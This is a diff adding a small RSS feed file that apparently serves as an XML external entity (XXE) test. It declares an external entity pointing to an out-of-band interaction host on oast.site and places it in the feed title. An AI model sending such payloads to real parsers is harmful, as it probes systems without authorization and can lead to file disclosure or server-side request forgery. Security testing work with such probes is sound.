@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://d77d4ev4nh6nm03nk7qgm4iy8u8jk41b3.oast.site/xxe-entity-test">
+]>
+<rss version="2.0">
+  <channel>
+    <title>&xxe;</title>
+    <link>http://example.com</link>
+    <description>Entity test</description>
+  </channel>
+</rss>
